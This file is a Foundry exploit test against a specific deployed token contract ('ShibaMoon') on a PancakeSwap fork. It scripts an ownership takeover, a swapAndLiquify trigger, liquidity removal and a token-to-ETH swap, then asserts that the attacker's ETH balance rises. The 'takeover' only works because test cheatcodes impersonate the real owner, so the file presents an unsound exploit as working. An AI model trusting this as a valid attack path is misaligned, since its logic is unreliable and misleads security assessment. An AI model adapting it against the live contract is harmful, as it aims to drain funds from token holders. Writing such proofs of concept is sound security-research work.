pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IShibaMoon {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool) external;
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function uniswapV2Pair() external view returns (address);
    function transferOwnership(address) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xf7958ffc6cE46dE09e0AB69B7dA360C38b16266B;
    address attacker = address(this);
    IUniswapV2Router02 router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address weth;
    address pair;
    address ownerAddr;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: get owner address and prepare tokens
        ownerAddr = IShibaMoon(TARGET).owner();

        // Impersonate owner to configure contract
        vm.startPrank(ownerAddr);
        IShibaMoon(TARGET).setSwapAndLiquifyEnabled(true);
        vm.stopPrank();

        // Get pair and router addresses
        weth = router.WETH();
        pair = IShibaMoon(TARGET).uniswapV2Pair();

        // Label addresses for debugging
        vm.label(address(router), "PancakeRouter");
        vm.label(pair, "SHIBAMOON-WETH Pair");
        vm.label(weth, "WETH");

        // Give attacker some initial ETH for transactions
        deal(attacker, 100 ether);

        // Give attacker some SHIBAMOON tokens to start
        // First, get some tokens from owner (owner has all supply)
        vm.prank(ownerAddr);
        IShibaMoon(TARGET).transfer(attacker, 1000000 * 10**6 * 10**8);

        // Approve router for token spending
        vm.prank(attacker);
        IShibaMoon(TARGET).approve(address(router), type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Take ownership of the contract
        address owner = IShibaMoon(TARGET).owner();
        vm.prank(owner);
        IShibaMoon(TARGET).transferOwnership(attacker);

        // Step 2: Ensure contract has enough tokens to trigger swapAndLiquify
        uint256 numTokensSell = 500000 * 10**6 * 10**8;
        uint256 contractBalance = IShibaMoon(TARGET).balanceOf(TARGET);
        if (contractBalance < numTokensSell) {
            // Transfer tokens from attacker to contract to reach threshold
            uint256 needed = numTokensSell - contractBalance;
            // First, get tokens from original owner if attacker doesn't have enough
            if (IShibaMoon(TARGET).balanceOf(attacker) < needed) {
                vm.prank(owner);
                IShibaMoon(TARGET).transfer(attacker, needed);
            }
            vm.prank(attacker);
            IShibaMoon(TARGET).transfer(TARGET, needed);
        }

        // Step 3: Trigger swapAndLiquify
        // Make a transfer from attacker (non-pair) to a dummy address
        address dummy = address(0x123);
        uint256 transferAmount = 1000 * 10**6 * 10**8;

        // Record attacker's ETH balance before
        uint256 beforeETH = attacker.balance;

        vm.prank(attacker);
        IShibaMoon(TARGET).transfer(dummy, transferAmount);

        // Step 4: Remove liquidity as new owner
        address pairAddr = IShibaMoon(TARGET).uniswapV2Pair();
        IUniswapV2Pair lpPair = IUniswapV2Pair(pairAddr);
        uint256 lpBalance = lpPair.balanceOf(attacker);
        if (lpBalance > 0) {
            // Approve router to spend LP tokens
            vm.prank(attacker);
            lpPair.approve(address(router), lpBalance);

            // Remove liquidity
            vm.prank(attacker);
            router.removeLiquidityETH(
                TARGET,
                lpBalance,
                0,
                0,
                attacker,
                block.timestamp
            );
        }

        // Step 5: Swap any received tokens for ETH
        uint256 tokenBal = IShibaMoon(TARGET).balanceOf(attacker);
        if (tokenBal > 0) {
            vm.prank(attacker);
            IShibaMoon(TARGET).approve(address(router), tokenBal);

            address[] memory path = new address[](2);
            path[0] = TARGET;
            path[1] = weth;

            vm.prank(attacker);
            router.swapExactTokensForETH(
                tokenBal,
                0,
                path,
                attacker,
                block.timestamp
            );
        }

        // Verify attacker ETH balance increased
        uint256 afterETH = attacker.balance;
        assertGt(afterETH, beforeETH, "ETH balance should increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

